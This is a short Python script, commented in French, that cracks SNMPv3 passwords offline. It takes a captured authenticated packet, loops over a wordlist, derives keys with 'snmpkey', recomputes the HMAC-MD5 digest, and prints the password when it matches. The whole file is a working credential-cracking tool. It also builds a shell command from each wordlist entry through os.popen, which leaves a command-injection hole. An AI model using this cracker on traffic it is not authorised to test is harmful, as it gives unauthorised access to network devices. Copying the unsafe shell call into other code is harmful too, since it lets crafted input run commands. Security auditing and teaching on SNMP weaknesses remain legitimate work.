import binascii
import argparse
import hashlib
import os
import re

def hex_xor(h1, h2): 
	b1=binascii.unhexlify(h1) 
	b2=binascii.unhexlify(h2)
	result=bytearray()
	for b1, b2 in zip(b1, b2) :
		result.append(b1 ^ b2)
	return binascii.hexlify(result)

parser = argparse.ArgumentParser()
parser.add_argument("file", help="Contenant un message snmpv3", type=str)
'''
	Le fichier est organise de la sorte : 
		Premiere ligne -> hex stream du paquet SNMPv3 authentifie (sans l'encapsulation)
'''
parser.add_argument("wordlist", help="Mots utilisés pour le brute force", type=str)
parser.parse_args()
args = parser.parse_args()

with open(args.wordlist, "r", encoding='ISO-8859-1') as f:
    contenu = f.read()
f.close()
listPass = contenu.split("\n")

with open(args.file, "r") as f:
    contenu = f.read()
f.close()
whole_message = binascii.unhexlify(contenu)
print("[+] Parametres")
print("")

IPAD = b"36"*64
OPAD = b"5c"*64
msgAuthoritativeEngineID = whole_message[31:48]
strMsgAuthoritativeEngineID = binascii.hexlify(msgAuthoritativeEngineID)
print("msgAuthoritativeEngineID : ", strMsgAuthoritativeEngineID)
msgAuthenticationParameters = whole_message[62:74]
strMsgAuthenticationParameters = binascii.hexlify(msgAuthenticationParameters).decode()
print("msgAuthenticationParameters : ", strMsgAuthenticationParameters)
whole_message_initial = whole_message[0:62] + b"\x00"*len(msgAuthenticationParameters) + whole_message[74:]
success = False
print("Taille de la wordlist : ", len(listPass))

for password in listPass :
	if password != "" :	
		print(password)
		auth_key = os.popen("snmpkey md5 '%s' %s" % (password, strMsgAuthoritativeEngineID.decode())).read()
		search = re.search(r'(?<=0x)\w{32}', auth_key)
		if search != None :
			auth_key = search.group(0)
		else :
			print("Erreur : ", auth_key)
		extendedAuthKey = auth_key + "00"*48
		K1 = hex_xor(extendedAuthKey, IPAD)
		K2 = hex_xor(extendedAuthKey, OPAD)
		hash_k1_msg = binascii.unhexlify(hashlib.md5(binascii.unhexlify(K1) + whole_message_initial).hexdigest())
		final_hash = hashlib.md5(binascii.unhexlify(K2) + hash_k1_msg).hexdigest()[:24]
		print("auth_key: "+auth_key)
		print("extended_auth_key: "+extendedAuthKey)
		print("K1: "+K1.decode())
		print("taille: "+str(len(K1)))
		print("K2: "+K2.decode())
		print("hash_k1: "+binascii.hexlify(hash_k1_msg).decode())
		print("final_hash: "+final_hash)
		
		
		if final_hash == strMsgAuthenticationParameters :
			print("Yaaaaay ! Mot de passe : ", password)
			success = True
			break
if success == False:
	print("Erf... Pas marche....")